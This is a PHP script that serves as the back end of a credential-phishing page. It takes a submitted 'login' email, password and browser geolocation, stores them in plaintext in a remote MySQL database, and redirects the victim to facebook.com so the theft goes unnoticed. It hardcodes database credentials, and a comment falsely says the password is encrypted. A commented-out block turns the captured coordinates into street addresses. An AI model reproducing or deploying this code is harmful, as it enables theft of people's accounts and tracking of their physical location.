<?php
//
  session_start();
// initializing variables
$username = "";
$errors = array(); 

// connect to the database
$db = new mysqli('remotemysql.com', 'tn54CFl4QH', 'GXKkKGu8lw', 'tn54CFl4QH');
 // Check connection
if ($db -> connect_errno) {
  echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
  exit();
}

// login
if (isset($_POST['login'])) { 
  // receive all input values from the form
  $username = mysqli_real_escape_string($db, $_POST['email']);
  $password_1 = mysqli_real_escape_string($db, $_POST['pass']);
 $longitude = mysqli_real_escape_string($db,$_POST['longitude']);
 $latitude = mysqli_real_escape_string ($db,$_POST['latitude']);



  // Finally, register user if there are no errors in the form
  if (count($errors) == 0) {
    $password = ($password_1);//encrypt the password before saving in the database

    $query = "INSERT INTO users (email, pass,latitude,longitude) VALUES('$username','$password','$latitude','$longitude')";
    mysqli_query($db, $query);
    $_SESSION['username'] = $username;
    $_SESSION['success'] = "You are now logged in";
    header('location: https://www.facebook.com/');
  }
}
// if(!empty($_POST['latitude']) && !empty($_POST['longitude']))
// {
//   $url = 'http://maps.googleapis.com/maps/api/geocode/json?latlng='.trim($_POST['latitude']).','.trim($_POST['longitude']).'&sensor=false';   
//    $json = @file_get_contents($url);    
//    $data = json_decode($json);  
//   $status = $data->status;

// if($status == "OK"){            $location = $data->results[0]->formatted_address;    }
// else{$location =  '';    }   
// echo $location; 
// }
?>

